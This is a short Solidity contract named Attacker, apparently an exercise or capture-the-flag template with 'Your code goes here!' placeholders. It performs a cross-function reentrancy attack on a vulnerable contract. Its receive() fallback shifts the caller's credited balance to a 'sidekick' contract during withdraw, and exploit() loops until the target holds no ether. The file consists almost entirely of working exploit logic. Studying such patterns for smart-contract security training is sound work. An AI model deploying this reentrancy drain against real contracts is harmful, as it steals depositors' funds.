// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;


interface IVulnerable {
    function withdraw() external;
    function deposit() external payable;
	function transferTo(address _recipient, uint _amount) external;
    function userBalance(address _user) external returns (uint256);
}

interface ISidekick {
	function exploit() external payable;
}


contract Attacker {

	IVulnerable public target;
	ISidekick public sidekick;
	
	constructor(address _target) {
		target = IVulnerable(_target);
	}

	function setSidekick(address _sidekick) public {
		sidekick = ISidekick(_sidekick);
	}

    receive() external payable {
        target.transferTo(address(sidekick), target.userBalance(address(this)));
        /*
            Your code goes here!
        */
    }

    function exploit() public payable {
        if(target.userBalance(address(this)) == 0) target.deposit{value: 1 ether}();
        target.withdraw();
        while(address(target).balance > 0){
            sidekick.exploit();
        }
        /*
            Your code goes here!
        */
    }
    
}